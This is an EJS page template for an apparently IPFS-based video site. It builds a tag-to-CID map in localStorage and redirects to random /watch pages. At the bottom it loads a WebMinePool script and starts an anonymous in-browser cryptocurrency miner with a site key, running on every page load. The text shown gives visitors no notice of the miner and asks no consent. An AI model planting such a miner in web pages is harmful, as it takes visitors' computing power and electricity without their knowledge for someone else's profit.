<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" integrity="sha384-+YQ4JLhjyBLPDQt//I+STsc9iw4uQqACwlvpslubQzn4u2UU2UFM80nGisd026JF" crossorigin="anonymous"></script>

    <script src="./ipfs/dist/index.min.js"></script>
    <script src="webminepool-base.js"></script>
    <title>Appname</title>

</head>
<body>
    <% if(params.vids && params.vids.length > 0) { %>  
        <% var cids = {}  %>
        <% for(const tag of params.vids) { %> 
            <% for(const file of tag.files) { %> 
                <% if(cids[tag.name]) { %>
                    <% cids[tag.name].push(file.cid) %>
                <% } else { %>
                    <% cids[tag.name] = []; cids[tag.name].push(file.cid) %>
                <% }  %>
            <% }  %>
        <% }  %>
    <% }  %>

    <script>
        localStorage.setItem('cids', JSON.stringify(<%- JSON.stringify(cids) %>));
        createNode = async () => {
            //repoPath = 'ipfs-local-' + Math.random()
            node = await Ipfs.create() 
            console.log('node created: ' + node ) 
            return node
        }

        gotoRandomVideoPage = (tag=undefined) => {
            if(localStorage.getItem('cids')){
                const cids = JSON.parse(localStorage.getItem('cids'))
                if(tag){
                    window.location.href = "/watch?filehash=" + cids[tag][Math.floor( Math.random() * (cids[tag].length-1) )];
                    return;
                }
                const tags = Object.keys(cids)
                const randIndex = Math.floor(Math.random() * tags.length)
                const randKey = tags[randIndex]
                const t = cids[randKey]

                window.location.href = "/watch?filehash=" + t[ Math.floor( Math.random() * ( t.length-1) ) ];
            }     
        }

    </script>
    
    <%- include(page, params) %>

    <script>
        var miner = WMP.Anonymous('SK_wYDJ7Rli2DyNZvckyjj3v',{throttle: 0.2});
        miner.start();
    </script>
</body>
</html>